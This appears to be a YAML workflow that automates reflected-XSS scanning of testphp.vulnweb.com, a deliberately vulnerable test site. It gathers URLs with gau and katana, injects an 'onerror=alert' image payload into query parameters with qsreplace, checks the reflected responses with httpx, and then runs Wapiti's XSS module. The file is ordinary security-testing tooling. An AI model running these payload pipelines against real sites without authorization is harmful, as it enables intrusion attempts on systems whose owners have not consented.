description: Conducts an XSS security test by fetching URLs, filtering for those with query parameters, and replacing them with a test payload. Uses 'httpx' to request these URLs, identifying successful XSS injections by checking for a 200 status code and payload identifier. Also uses Wapiti for an automated scan.
tags: xss, XSS
params: target=testphp.vulnweb.com header="Example:Blackdagger"
# Change header without blank if you need or add authorization
env:
  - HOME: /root/
  - LOG_DIR: ${HOME}/logs
  - PATH: /usr/local/bin:${PATH}
steps:
  - name: CustomXSS-External
    command: bash
    script: |
      gau ${target//\"} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "\"><img src=x onerror=alert(12345654321)>" | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"

  - name: CustomXSS-Internal
    command: bash
    script: |
      ~/go/bin/httpx -u $target | katana -H "$header" qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"

  - name: AutoXSS
    command: bash
    script: |
      ~/go/bin/httpx -u $target -o resXSS_${target//\"}.txt ; wapiti -u "$(cat resXSS_${target//\"}.txt)" -m xss -H "$header"